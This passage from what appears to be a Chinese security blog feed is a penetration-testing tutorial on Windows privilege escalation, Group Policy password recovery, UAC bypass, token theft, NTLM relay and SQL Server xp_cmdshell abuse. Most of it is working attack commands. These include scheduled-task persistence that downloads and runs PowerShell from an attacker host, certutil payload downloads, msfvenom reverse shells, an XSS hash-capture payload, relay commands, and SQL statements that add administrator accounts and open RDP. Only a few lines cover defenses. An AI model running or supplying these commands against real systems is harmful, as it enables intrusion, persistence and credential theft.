class="line">1</span><br></pre></td><td class="code"><pre><span class="line">accesschk.exe -dqv &quot;D:\test\&quot; -accepteula    </span><br></pre></td></tr></table></figure><p>若有权限则远程下载payload将原任务文件覆盖。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -split -f &quot;http://xxxxxx/payload.exe&quot; D:\test\test.exe</span><br></pre></td></tr></table></figure><p><strong>创建新任务</strong></p><p>也可以强制创建计划任务test，开机时启动，启动权限为system。onlogon为登录时，onidle  -i 1为空闲时。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /tn test /sc onstart /tr payload.exe /ru system /f</span><br></pre></td></tr></table></figure><p><strong>empire</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">usemodule persistence/elevated/schtasks </span><br><span class="line">set DailyTime 14:30 </span><br><span class="line">set Listener fxxx </span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>等待到达设定的时间即可获得system权限的shell。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210214222645.png"></p><p>还可以设置set RegPath，则会变成一个延时的注册表后门。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set RegPath HKCU:Software\Microsoft\Windows\CurrentVersion\Run</span><br></pre></td></tr></table></figure><p><strong>msf</strong></p><p>此模块支持在本地监听一个端口，别人一旦访问该端口就会将该端口内的文件读取至本地执行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/script/web_delivery </span><br><span class="line">set target 2 </span><br><span class="line">set payload windows/meterpreter/reverse_tcp </span><br><span class="line">set lhost 172.16.1.7 </span><br><span class="line">set URIPATH / </span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210214222729.png"></p><p>任务运行后msf会收到会话。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /tn test /sc onidle /ru system /i 1 /tr &quot;c:\windows\system32\powershell.exe -windowStyle hiiden -NoLogo -Nointeractive -ep bypass -nop -c &#x27;IEX((new-object net.webclient).downloadstring(&#x27;&#x27;http://172.16.1.7:8080/CZcIHXcRs9x&#x27;&#x27;&#x27;))&#x27;&quot;</span><br></pre></td></tr></table></figure><p><strong>powersploit</strong></p><p>win7没成功，win2012成功，推测和ps版本有关。</p><p>先生成payload文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_https lhost=172.16.1.7 lport=443 -f psh-reflection -o fxxx.ps1</span><br></pre></td></tr></table></figure><p>执行Persistence.psm1，生成persistence.ps1。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import-module ./Persistence.psm1 </span><br><span class="line">$ElevatedOptions = New-ElevatedPersistenceOption -ScheduledTask -OnIdle </span><br><span class="line">$UserOptions = New-UserPersistenceOption -ScheduledTask -OnIdle </span><br><span class="line">Add-Persistence -FilePath ./fxxx.ps1 -ElevatedPersistenceOption $ElevatedOptions -UserPersistenceoption $UserOptions -Verbose</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210214222758.png"></p><p>然后将生成的persistence.ps1放到web服务器上，在目标机器中远程加载。或者直接在本地加载。</p><p>ps：单独执行powershell.exe -NonInteractive会返回当前账户权限。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell -Nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;http://172.16.1.1/persistence.ps1&#x27;);&quot; </span><br><span class="line">schtasks /Create /RU system /SC ONIDLE /I 1 /TN Updater /TR &quot;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonInteractive&quot; </span><br></pre></td></tr></table></figure><p>直接获得system权限。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210214222913.png"></p><p><strong>检测工具</strong></p><p>Autoruns</p><h1 id="组策略首选项提权"><a href="#组策略首选项提权" class="headerlink" title="组策略首选项提权"></a><strong>组策略首选项提权</strong></h1><p>SYSVOL是AD里面自动创建的一个用于存储域公共文件服务器副本（登录脚本、组策略数据等）的共享文件夹，在域中的所有域控制器之间进行自动同步和共享复制。SYSVOL在所有经过身份验证的域用户或者域信任用户具有读权限的活动目录的域范围内共享。所有的域策略均存放在C:\Windows\SYSVOL\DOMAIN\Policies\目录中。</p><p>常见的组策略首选项（GPP）：</p><ul><li>映射驱动器(Drives.xml) </li><li>数据源(DataSources.xml) </li><li>打印机配置(Printers.xml) </li><li>创建、更新服务(Services.xml) </li><li>计划任务(ScheduledTasks.xml)</li></ul><p>在域环境中，为了方便对所有的机器进行操作如修改本地管理员密码等，网管会使用域策略进行统一的配置和管理。</p><p><strong>利用组策略批量创建用户</strong></p><p>gpmc.msc</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210214202341.png"></p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210214202438.png"></p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210214202505.png"></p><p>随后强制更新组策略。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpupdate /force</span><br></pre></td></tr></table></figure><p>在SYSVOL中自动生成Groups.xml。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\SYSVOL\sysvol\holy.testA\Policies\&#123;5FAF9E4D-C8D4-42F0-B056-E4BDC9096632&#125;\Machine\Preferences\Groups\Groups.xml</span><br></pre></td></tr></table></figure><p>也能用type命令查找</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type \\DC\SYSVOL\holy.testA\Policies\&#123;5FAF9E4D-C8D4-42F0-B056-E4BDC9096632&#125;\MACHINE\Preferences\Groups\Groups.xml</span><br></pre></td></tr></table></figure><p>该密码使用AES-256加密算法。2012年微软在官方网站上公布了该密码的私钥，导致任何域用户和域信任的用户均可访问该共享目录保存在XML文件中的密码并将其解密，从而控制域中所有使用该账号、密码的本地管理员计算机。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210214203153.png"></p><p>除了Groups.xml还有几个组策略首选项文件中有cpassword属性。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">services\services.xml </span><br><span class="line">scheduledtasks\scheduledtasks.xml </span><br><span class="line">printers\printers.xml </span><br><span class="line">drives\drives.xml </span><br><span class="line">datasources\datasources.xml</span><br></pre></td></tr></table></figure><p><strong>PowerSploit</strong></p><p>只需要以域用户权限登录任意一台域内机器执行即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Get-GPPPassword.ps1;Get-GPPPassword</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210214203239.png"></p><p><strong>MSF</strong></p><p>只需要以域用户权限登录任意一台域内机器执行即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use post/windows/gather/credentials/gpp</span><br><span class="line">set session 1</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210214203426.png"></p><p><strong>Empire</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usemodule privesc/gpp</span><br></pre></td></tr></table></figure><p><strong>防御</strong></p><p>安装 KB2962486补丁，防止新的凭据被放置在组策略首选项中。</p><p>此外，针对Everyone访问权限进行设置，具体如下：</p><ul><li>设置共享文件夹SYSVOL的访问权限。</li><li>将包含组策略密码的XML文件从SYSVOL目录中删除。</li><li>不要把密码放在所有域用户都有权访问的文件中。</li><li>如果需要更改域中机器的本地管理员密码，建议使用LAPS。</li></ul><h1 id="绕过UAC提权"><a href="#绕过UAC提权" class="headerlink" title="绕过UAC提权"></a><strong>绕过UAC提权</strong></h1><p>UAC要求用户在执行可能影响计算机或其他用户的操作前，对用户身份进行认证，需要拥有相应权限的密码，如：磁盘根目录、注册表、设备驱动程序、UAC设置等功能。高等级进程有管理员权限，中等级进程有普通用户权限，低等级进程权限是有限的。</p><p><strong>前提</strong></p><ul><li>当前UAC必须为默认设置，“仅在程序试图改变。。。。”</li><li>当前用户必须在管理员组中，domain admins组和本地管理员组均可。</li></ul><p><strong>MSF</strong></p><p>bypassuac</p><p>此模块将通过进程注入使用可信任发布者证书绕过Windows UAC，生成第二个shell，获得system权限，会在目标机上创建多个文件，可能被查杀。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">getuid </span><br><span class="line">getsystem                   检查是否有system权限 </span><br><span class="line">use exploit/windows/local/bypassuac </span><br><span class="line">set session 1 </span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210214104248.png"></p><p>bypassuac_injection（没成功）</p><p>该模块直接运行在反射的dll中，不会接触硬盘，降低查杀概率。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/local/bypassuac_injection </span><br></pre></td></tr></table></figure><p>bypassuac_fodhelper（win10）</p><p>该模块劫持当前用户配置单元下注册表中的特殊键，插入自定义命令来绕过Windows 10 UAC，该命令将在启动fodhelper.exe应用程序时调用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/local/bypassuac_fodhelper </span><br><span class="line">set session 1 </span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210214110048.png"></p><p>bypassuac_eventvwr</p><p>该模块劫持当前用户配置单元下注册表中的特殊键，插入自定义命令来绕过UAC。在payload之后会自动将修改的注册表项清除。该模块不需要payload的体系架构和操作系统匹配。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/local/bypassuac_eventvwr </span><br><span class="line">set session 1 </span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210214110220.png"></p><p>bypassuac_comhijack（没成功）</p><p>此模块将通过在hkcu配置单元中创建COM处理程序注册表项来绕过Windows UAC。当加载某些较高完整性级别进程时，会引用这些注册表项，从而导致进程加载用户控制的dll。此模块修改注册表项，但在调用payload后将清除该项。该模块需要payload的体系架构和操作系统匹配。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/local/bypassuac_comhijack </span><br></pre></td></tr></table></figure><p>RunAs模块（多系统版本）</p><p>该模块会创建一个可执行文件，目标机器会弹出是否继续运行的对话框，用户选择是之后会返回高权限shell，对UAC设置没有要求。需要当前用户在管理组中或知道管理员密码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/local/ask</span><br></pre></td></tr></table></figure><p><strong>Nishang</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-PsUACme -method oobe -Payload &quot;powershell -windowsyle hidden -e xxxxxx&quot;</span><br></pre></td></tr></table></figure><p><strong>Empire</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">usemodule privesc/bypassuac </span><br><span class="line">usemodule privesc/bypassuac_wscript  适用于win7，暂时无补丁，低概率被查杀</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210214110413.png"></p><p><strong>防御</strong></p><p>不让内网机器的使用者拥有本地管理员或域管理组权限，将UAC设置为“始终通知”。</p><h1 id="令牌窃取提权"><a href="#令牌窃取提权" class="headerlink" title="令牌窃取提权"></a><strong>令牌窃取提权</strong></h1><p>令牌：系统中的临时密钥，相当于账户和密码，用来确定请求属于的用户身份以及是否允许请求。获得令牌即可不提供密码或其他凭证的情况下访问系统和网络资源，这些令牌持续存在于系统中，除非系统重启。伪造令牌的核心是Kerberos协议。</p><ul><li>Delegation Tokens：                    授权令牌，支持交互式登录（远程桌面等）。</li><li>Impersonation Tokens：              模拟令牌，支持非交互式会话。</li></ul><p>ps：密保令牌属于物理设备，如U盾。</p><p><strong>MSF</strong></p><p>前提是已经获取到一个session。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use incognito </span><br><span class="line">list_tokens -u           列出可用令牌 </span><br><span class="line">impersonate_token &quot;NT AUTHORITY\\SYSTEM&quot;   假冒用户，这里是两个反斜杠\\ </span><br><span class="line">shell</span><br></pre></td></tr></table></figure><p>两种token只在系统重启后清除，具有Delegation token的用户在注销后，该Token将变成Impersonation token，依旧有效。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210214102231.png"></p><p><strong>MSF+Rotten potato</strong></p><p>不能直接获取令牌的情况下考虑用工具绕过。</p><p><a href="https://github.com/foxglovesec/RottenPotato.git">https://github.com/foxglovesec/RottenPotato.git</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use incognito</span><br><span class="line">list_tokens -u </span><br><span class="line">upload /root/RottenPotato-master/rottenpotato.exe    上传到目标机反弹码目录，默认是桌面</span><br><span class="line">execute -HC -f rottenpotato.exe    目标机需要.net 4.0以上，否则会在目标机上报错且无法成功利用 </span><br><span class="line">impersonate_token &quot;NT AUTHORITY\\SYSTEM&quot; </span><br><span class="line">getuid</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210214102409.png"></p><p>若获取了域管用户令牌，则可在meterpreter中远程向域控添加用户。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add_user test test123456. -h 1.1.1.2              添加用户 </span><br><span class="line">add_group_user &quot;domain admins&quot; test -h 1.1.1.2    把用户添加到管理组</span><br></pre></td></tr></table></figure><p><strong>migrate迁移进程</strong></p><p>通过迭代的方式，将权限迁移到域管用户。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">administrator-&gt;system </span><br><span class="line">administrator-&gt;域管用户 </span><br><span class="line">域管用户无法-&gt;system </span><br><span class="line">域管用户无法-&gt;administrator</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210214102517.png"></p><p><strong>Empire</strong></p><p>先获取本地管理员权限，然后使用内置的mimikatz，输入creds查看登录过该系统的账户和密码，看能否找到域管用户。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210214102804.png"></p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210214102826.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pth ID     hash传递，生成cmd进程，这里的ID必须是类型为hash的CredID，目标机器会弹出高权限cmd窗口 </span><br><span class="line">steal_token pid    窃取进程令牌，可直接寻找system权限进程 </span><br><span class="line">revtoself          将令牌权限恢复到原来的权限</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210214103004.png"></p><p><strong>防御</strong></p><ul><li>限制令牌时效性。</li><li>使用加密链路SSL&#x2F;TLS传输令牌。</li></ul><h1 id="ntlm-relay攻击"><a href="#ntlm-relay攻击" class="headerlink" title="ntlm relay攻击"></a><strong>ntlm relay攻击</strong></h1><p>内网环境中，没有获取任何凭证或令牌的情况下，可使用LLMNR和NetBIOS，从而利用ntlm协议进行中继攻击，相当于是中间人攻击，攻击者获取了高权限用户的hash，可将hash转发给其他主机并执行命令。</p><p><strong>LLMNR</strong></p><p>本地链路多播名称解析，是一种数据包格式，基于DNS，可以将主机名解析为ipv4或ipv6地址。构造不存在的主机名，则无法使用DNS服务器进行解析，客户端会使用LLMNR解析本地网段中的机器名称。</p><p>流程为：主机通过UDP协议向组播地址224.0.0.252的5355端口发送多播查询请求，来获取主机名的对应IP，所有支持LLMNR的主机收到查询请求后，会对比自己主机名，不同就不回应，相同就向查询主机发送包含自己IP地址的单播信息。由于是UDP协议，查询主机无法确认响应主机是否正确，就会给欺骗创造条件。</p><p><strong>NetBIOS</strong></p><p>网络协议，将计算机名称并解析为ip，不支持ipv6。</p><p>NetBIOS-NS名称服务，用于名称注册和解析，该服务需要使用域名服务器注册NetBIOS名称，默认监听UDP的137端口，也可以使用TCP的137端口。</p><p><strong>Responder</strong></p><p>先尝试responder，一款内网监听工具，需要和目标机同一网段，利用不同的服务如SMB、MSSQL、常规漏洞等来捕捉客户端发送的LLMNR和NBT-NS请求并进行响应，获得Net-NTLM hash。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python Responder.py -I eth0 -rPv</span><br></pre></td></tr></table></figure><p>环境部署：</p><ul><li>win7：172.16.1.10           域内目标，登录域管账户</li><li>kali：172.16.1.7                中继，作为中继的机器必须要有域管理员权限或本地管理员权限</li><li>win2008：172.16.1.11     域内目标，登录低权限域账户</li><li>win2012：172.16.1.6       DC</li></ul><p><strong>通过SMB服务获取Net-NTLM hash</strong></p><p>客户端在连接服务端时，默认先使用本机的用户名和密码hash尝试登录，所以可以模拟SMB服务器来截获hash。用户名密码随便输。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\172.16.1.7\a</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210214112811.png"></p><p><strong>通过XSS获取Net-NTLM hash</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.16.1.1/practice/xss/xss.php?test=&lt;img/src=\\172.16.1.7\a&gt;</span><br></pre></td></tr></table></figure><p>讲道理curl应该也行。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210214113626.png"></p><p><strong>通过WPAD代理服务器抓取</strong></p><p>WPAD用于在windows中自动化的设置ie浏览器的代理，加-F参数当PC浏览网站时即可抓取到NTLM hash，而且当主机重启时也能抓到机器账户的NTLM hash。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python Responder.py -I eth0 -rPv -F</span><br></pre></td></tr></table></figure><p>只有高权限用户有效，低权限用户需要认证。win7没成功。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210214113730.png"></p><p><strong>利用hashcat等工具脱机破解</strong></p><p>-m：hash-type，5600对应Net-NTLMv2。事先准备好password字典。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210214161446.png"></p><p>结果会存放在当前目录.potfile文件。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210214125112.png"></p><p><strong>relay</strong></p><p>修改Responder.conf文件防止冲突。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210214123316.png"></p><p>启动，这里抓取域管账号的hash，等待其访问网页即可。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210214123355.png"></p><p>利用工具中的MultiRelay模块，若responder成功抓到hash的话，则会自动转发到MultiRelay这里从而获得目标机器的shell。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python MultiRelay.py -t 172.16.1.10 -u ALL</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210214123422.png"></p><p><strong>ntlmrelayx.py</strong></p><p>类似方法采用impacket工具包中的ntlmrelayx.py和smbrelayx.py。</p><p>该脚本开启后会在本地开启很多服务用来钓鱼，包括http、smb等。真实环境中需要诱导管理员访问这些服务，输入账号密码进行验证。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210214175929.png"></p><p>充当中继，开启监听。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ntlmrelayx.py -t smb://172.16.1.11 -c whoami -smb2support</span><br></pre></td></tr></table></figure><p>在靶机中访问kali的smb服务。</p><p>relay到域控账户的Net-NTLM-Hash在win2008上执行了whoami命令。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210214184424.png"></p><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>禁用 NTLM协议并切换到 Kerberos协议。无法禁用的话，则启用 SMB 签名或LDAP签名等来缓解。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>《内网安全攻防:渗透测试实战指南》</p><p><a href="https://www.jianshu.com/p/1b545a8b8b1e">https://www.jianshu.com/p/1b545a8b8b1e</a></p><p><a href="https://blog.csdn.net/qq_36119192/article/details/105135184">https://blog.csdn.net/qq_36119192/article/details/105135184</a></p><p><a href="https://xz.aliyun.com/t/6623">https://xz.aliyun.com/t/6623</a></p>]]></content>
      
      
      <categories>
          
          <category> 提权 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 提权 </tag>
            
            <tag> 令牌 </tag>
            
            <tag> NTLM </tag>
            
            <tag> 注册表 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQLServer提权</title>
      <link href="/2021/02/13/7e410911.html"/>
      <url>/2021/02/13/7e410911.html</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>总的来说就是调用各种存储过程执行系统命令、写入注册表、写入文件等操作。</p><p><strong>数据库用户角色</strong></p><p>一般会遇到三种角色：syadmin 、db_owner 、public 。</p><ul><li><p>syadmin：</p><p>固有服务器角色，sa即属于syadmin成员，为mssql默认系统账号，具有最高权限。除了一些基本的对数据库拥有读取、写入权限外，就是可以通过大部分存储过程执行dos命令。</p></li><li><p>db_owner：</p><p>固有数据库角色，拥有对数据库的修改、删除、新增数据表、执行大部分存储过程的权限。但涉及到一些敏感操作如xp_cmdshell等存储过程则没有权限。</p></li><li><p>public：</p><p>固定数据库角色，每个合法用户都属于该角色，可以列目录或建立临时表。</p></li></ul><p><strong>xp_cmdshell</strong></p><p>存储过程，将命令字符串作为操作系统命令shell执行，并以文本行的形式返回所有输出。只有在sysadmin权限下才可以使用xp_cmdshell。ps：非SA用户也可以设置为sysadmin。</p><p>查看SQL 2005帐户所属服务器角色。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select SrvRole = g.name, MemberName = u.name, MemberSID = u.sid from sys.server_principals u, sys.server_principals g, sys.server_role_members m where g.principal_id = m.role_principal_id and u.principal_id = m.member_principal_id order by 1, 2</span><br></pre></td></tr></table></figure><p>查看SQL 2005帐户所属数据库角色。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select DbRole = g.name, MemberName = u.name, MemberSID = u.sid from sys.database_principals u, sys.database_principals g, sys.database_role_members m where g.principal_id = m.role_principal_id and u.principal_id = m.member_principal_id order by 1, 2</span><br></pre></td></tr></table></figure><h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><h2 id="xp-cmdshell"><a href="#xp-cmdshell" class="headerlink" title="xp_cmdshell"></a><strong>xp_cmdshell</strong></h2><ol><li><p>翻配置文件，连数据库。</p><p>数据库连接文件的名称一般为 conn.asp、openconnection.asp、connection.asp等，这些文件多位于网站的根目录或者includes等文件夹下。</p></li><li><p>判断存储过程这个字段是否存在，没有的话需要添加。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*) from master.dbo.sysobjects where xtype = &#x27;x&#x27; and name= &#x27;xp_cmdshell&#x27;;</span><br></pre></td></tr></table></figure><p>返回”1”，证明存在。返回”2”，可能是添加多了。。。。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from master.dbo.sysobjects where xtype = &#x27;x&#x27; and name= &#x27;xp_cmdshell&#x27;;</span><br></pre></td></tr></table></figure></li><li><p>启用xp_cmdshell存储过程。</p><p>xp_cmdshell在mssql2000中默认开启，2005及以后版本默认关闭。如果没有开启xp_cmdshell，且拥有 sysadmin 权限，则执行以下语句恢复。sp_configure 是修改系统配置的存储过程。当设置show advanced options参数为1时，才允许修改系统配置中的某些高级选相，这些高级选项默认不允许修改。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;,1;RECONFIGURE;</span><br><span class="line">EXEC sp_configure &#x27;xp_cmdshell&#x27;,1;RECONFIGURE;（需要关的话换成0）</span><br></pre></td></tr></table></figure><p>无法启用可能是删除了这个字段，可以用xplog70.dll恢复。ps：xplog70.dll、odsole70.dll、xpstar.dll等dll文件都可尝试。</p><p>xplog70.dll存在时：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">exec sp_addextendedproc xp_cmdshell,@dllname=&#x27;xplog70.dll&#x27;;</span><br><span class="line">或者</span><br><span class="line">Use master dbcc addextendedproc(&#x27;xp_cmdshell&#x27;,&#x27;xplog70.dll&#x27;);</span><br></pre></td></tr></table></figure><p>xplog70.dll不存在时，可以将xplog70.dll上传到目标机器的c盘根目录下，必须指定路径：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec sp_addextendedproc xp_cmdshell,@dllname=&#x27;c:\xplog70.dll&#x27;;</span><br></pre></td></tr></table></figure></li><li><p>添加用户并放到管理员组。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Exec master.dbo.xp_cmdshell &#x27;net user lalala 123456 /add &amp; net localgroup administrators lalala /add&#x27;;</span><br></pre></td></tr></table></figure></li></ol><p>常用命令：</p><p>开启3389：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_cmdshell &#x27;sc config termservice start= auto&#x27;; </span><br><span class="line">exec master..xp_cmdshell &#x27;net start termservice&#x27;;</span><br></pre></td></tr></table></figure><p>编辑注册表允许远程连接，并重置RDP端口为3389。关闭将0x00改为0x01：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec xp_cmdshell &#x27;reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0x00 /f&#x27;;</span><br></pre></td></tr></table></figure><p>利用注入点：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1；exec master.dbo.xp_cmdshell &#x27;net user 1 1 /add&#x27;--</span><br></pre></td></tr></table></figure><h2 id="wscript-shell"><a href="#wscript-shell" class="headerlink" 